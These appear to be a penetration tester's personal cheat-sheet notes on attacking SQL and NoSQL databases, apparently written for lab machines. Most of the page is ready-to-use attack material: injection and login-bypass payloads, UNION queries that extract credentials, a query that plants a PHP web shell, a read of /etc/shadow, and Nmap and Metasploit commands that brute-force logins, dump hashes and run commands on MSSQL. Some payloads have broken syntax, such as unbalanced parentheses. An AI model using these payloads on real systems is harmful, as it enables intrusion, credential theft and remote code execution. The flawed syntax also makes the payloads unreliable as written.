SQL Injection is an attack in which malicious SQL statements are injected into SQL
easy to avoid

# Common SQL Verbs
SQL statment begin with verbs
SELECT
INSERT
DELETE
UPDATE
DROP
UNION


```mysql
SHOW COLUMNS FROM database_name. table_name; # show columns
```

# NoSql commands
https://blog.e-zest.com/basic-commands-for-mongodb


## Mongodb


downloading the following tar archive file
```
curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz
```

We must then extract the contents of the tar archive file using the tar utility.

```
tar xvf mongodb-linux-x86_64-3.4.7.tgz
```

Navigate to the location where the mongo binary is present.

```
cd mongodb-linux-x86_64-3.4.7/bin
```
Let's now try to connect to the MongoDB server running on the remote host as an anonymous user.


```bash
mongo -p -u USER DATABASE




show dbs;
use # DATABASE NAME;
show collections;
db.COLLECTION_NAME.find().pretty;


# More commands
db.tasks.insert({}) # create 
db.tasks.find() # run 

```

```sql
-- Nosql injection
`[$ne]=1`, `{$gt: ''}`
` ||  ( COMMAND ) || `

` ||  (select sql from sqlite_master ) || `
select * from TABLE 
select COLUMN from TABBLE


' || 1==1 
' || 1==1%00 -- login bypass

```


# Additional to [[SQL-Injection (SQLi)]]
from [[00 Progress/Boxes/HTB/Linux/Shared/01 Exploit]]

change # to the values


1- union select 1,(select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA,3-- -

2- union select 1,(select group_concat(TABBLE_NAME,':',COLUMN_NAME) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA like '# DATABASE NAME '),3-- -

3- union select 1,(select group_concat(# username ,':',# password) from # user  ,3-- -



# RCE WITH SQL injection

**Description**: 
After finding sql injection with union technique (POST REQUEST) we can upload a reverse shell on the target machine and access it through the webpage see 
**Reference:** 
https://youtu.be/UqoVQ4dbYaI?t=522

# If we have file perm
```sql

' union select "<?php SYSTEM($_REQUEST['cmd']) ?>" INTO OUTFILE '/var/www/html/nshell.php'-- - '

-- uploading a php shell named shell.php with cmd parameter for RCE and saved to /var/www/html/nshell.php 


select load_file("/etc/shadow"); -- read perm
```


# Nmap

```bash

nmap -p3306 --script=mysql-empty-password # check for users with empty password

nmap -p3306 --script=mysql-info

nmap -p3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" #bruteforce check for empty pass

nmap -p3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"

nmap -p3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"

nmap -p3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
# Hash dump


# WINDOWS

nmap -p1433 --script ms-sql-info # more info

nmap -p1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433(PORT)

nmap -p1433 --script ms-sql-brute --script-args userdb=WORDLIST,passdb=WORDLIST #Brute force

nmap -p1433 --script ms-sql-empty-password #Brute force empty password

nmap -p1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=admin,ms-sql-query.query="QUERY HERE" 
# Send Query

nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=admin # Dump Hashes

nmap -p1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=admin,ms-xp-cmdshell.cmd="COMMAND" # RCE 

```


# Metasploit

```ruby








# WINDOWS

use auxiliary/scanner/mssql/mssql_login # brute force login

use auxiliary/admin/mssql/mssql_enum

use auxiliary/admin/mssql/mssql_enum_sql_logins

use auxiliary/admin/mssql/mssql_exec # RCE 

use auxiliary/admin/mssql/mssql_enum_domain_accounts 


use auxiliary/scanner/mssql/mssql_hashdump


# Mysql

use auxiliary/scanner/mysql/mysql_writable_dirs # check for writable dir
use auxiliary/scanner/mysql/mysql_hashdump # dump hashes
-   auxiliary/admin/mysql/mysql_enum # enum mysql database with creds
-   auxiliary/admin/mysql/mysql_sql # Send queries to mysql database 
-   auxiliary/scanner/mysql/mysql_file_enum
-   auxiliary/scanner/mysql/mysql_hashdump
-   auxiliary/scanner/mysql/mysql_login # brute force login
-   auxiliary/scanner/mysql/mysql_schemadump # enum mysql schema
-   auxiliary/scanner/mysql/mysql_version # checks for mysql version

```


